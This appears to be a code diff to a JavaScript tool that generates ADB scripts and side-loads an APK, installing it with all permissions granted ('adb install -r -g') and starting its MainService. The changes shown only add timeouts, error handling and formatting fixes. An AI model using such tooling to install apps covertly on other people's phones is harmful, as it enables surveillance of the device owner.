@@ -1009,8 +1009,7 @@ adb shell am startservice %PACKAGE%/%PACKAGE%.MainService 2>nul
 echo.
 echo [+] All permissions granted successfully!
 echo [!] Note: Some permissions may require manual approval on Android 10+
-pause
-`;
+pause`;
         
         // Unix/Linux shell script
         let shScript = `#!/bin/bash
@@ -1054,16 +1053,15 @@ adb shell am startservice $PACKAGE/$PACKAGE.MainService 2>/dev/null
 
 echo ""
 echo "[+] All permissions granted successfully!"
-echo "[!] Note: Some permissions may require manual approval on Android 10+"
-`;
+echo "[!] Note: Some permissions may require manual approval on Android 10+"`;
         
         try {
             fs.writeFileSync(dir.join(outputPath, 'grant_permissions.bat'), batScript);
             fs.writeFileSync(dir.join(outputPath, 'grant_permissions.sh'), shScript);
             delayedLog('[✓] ADB permission scripts generated:', CONSTANTS.logStatus.SUCCESS);
-                        delayedLog(`    └─ ${dir.join(outputPath, 'grant_permissions.bat')}`, CONSTANTS.logStatus.INFO);
-                        delayedLog(`    └─ ${dir.join(outputPath, 'grant_permissions.sh')}`, CONSTANTS.logStatus.INFO);
-                        delayedLog(`[ℹ] Output folder: ${outputPath}`, CONSTANTS.logStatus.INFO);
+            delayedLog(`    └─ ${dir.join(outputPath, 'grant_permissions.bat')}`, CONSTANTS.logStatus.INFO);
+            delayedLog(`    └─ ${dir.join(outputPath, 'grant_permissions.sh')}`, CONSTANTS.logStatus.INFO);
+            delayedLog(`[ℹ] Output folder: ${outputPath}`, CONSTANTS.logStatus.INFO);
         } catch (e) {
             delayedLog('[!] Failed to generate ADB scripts', CONSTANTS.logStatus.WARNING);
         }
@@ -1787,16 +1785,76 @@ echo "[!] Note: Some permissions may require manual approval on Android 10+"
         $appCtrl.Log('[→] Checking device connection...', CONSTANTS.logStatus.INFO);
         
         try {
-            // Check devices
-            const devices = await exec('adb devices');
-            if (!devices.stdout.includes('device') || devices.stdout.trim().split('\n').length <= 1) {
-                $appCtrl.Log('[✗] No device connected via ADB', CONSTANTS.logStatus.FAIL);
+            // Check devices with timeout
+            $appCtrl.Log('[→] Checking ADB connection...', CONSTANTS.logStatus.INFO);
+            const devicesPromise = exec('adb devices', {
+                maxBuffer: 1024 * 1024,
+                timeout: 10000 // 10 second timeout
+            });
+            
+            let devices;
+            try {
+                devices = await Promise.race([
+                    devicesPromise,
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('ADB timeout')), 10000))
+                ]);
+            } catch (error) {
+                $appCtrl.Log('[✗] ADB not responding or not found in PATH', CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log('[ℹ] Make sure ADB is installed and accessible', CONSTANTS.logStatus.INFO);
                 return;
             }
+            
+            const deviceOutput = devices.stdout || '';
+            const deviceLines = deviceOutput.trim().split('\n').filter(line => 
+                line.trim() && !line.includes('List of devices')
+            );
+            
+            if (deviceLines.length === 0 || !deviceOutput.includes('device')) {
+                $appCtrl.Log('[✗] No device connected via ADB', CONSTANTS.logStatus.FAIL);
+                $appCtrl.Log('[ℹ] Connect your device and enable USB debugging', CONSTANTS.logStatus.INFO);
+                return;
+            }
+            
+            $appCtrl.Log(`[✓] Device detected: ${deviceLines[0].split('\t')[0]}`, CONSTANTS.logStatus.SUCCESS);
 
             $appCtrl.Log(`[→] Installing APK: ${path.basename(apkPath)}...`, CONSTANTS.logStatus.INFO);
-            await exec(`adb install -r -g "${apkPath}"`);
-            $appCtrl.Log('[✓] APK installed successfully', CONSTANTS.logStatus.SUCCESS);
+            
+            // Install with timeout and better error handling
+            const installPromise = exec(`adb install -r -g "${apkPath}"`, {
+                maxBuffer: 10 * 1024 * 1024, // 10MB buffer
+                timeout: 60000 // 60 second timeout
+            });
+            
+            // Add timeout wrapper
+            const timeoutPromise = new Promise((_, reject) => {
+                setTimeout(() => reject(new Error('Install timeout after 60 seconds')), 60000);
+            });
+            
+            try {
+                const result = await Promise.race([installPromise, timeoutPromise]);
+                if (result.stdout) {
+                    console.log('[ADB Install]', result.stdout);
+                }
+                if (result.stderr && !result.stderr.includes('Success')) {
+                    console.warn('[ADB Install]', result.stderr);
+                }
+                $appCtrl.Log('[✓] APK installed successfully', CONSTANTS.logStatus.SUCCESS);
+            } catch (error) {
+                // Check if it's actually a success (adb sometimes outputs to stderr)
+                if (error.stderr && (error.stderr.includes('Success') || error.stderr.includes('success'))) {
+                    $appCtrl.Log('[✓] APK installed successfully', CONSTANTS.logStatus.SUCCESS);
+                } else if (error.message.includes('timeout')) {
+                    $appCtrl.Log('[✗] Install timeout - device may be slow or unresponsive', CONSTANTS.logStatus.FAIL);
+                    $appCtrl.Log('[ℹ] Try installing manually: adb install -r -g "' + apkPath + '"', CONSTANTS.logStatus.INFO);
+                    throw error;
+                } else {
+                    $appCtrl.Log(`[✗] Install failed: ${error.message}`, CONSTANTS.logStatus.FAIL);
+                    if (error.stderr) {
+                        $appCtrl.Log(`[ℹ] ADB output: ${error.stderr.substring(0, 200)}`, CONSTANTS.logStatus.INFO);
+                    }
+                    throw error;
+                }
+            }
 
             // Grant permissions
             $appCtrl.Log('[→] Granting permissions...', CONSTANTS.logStatus.INFO);
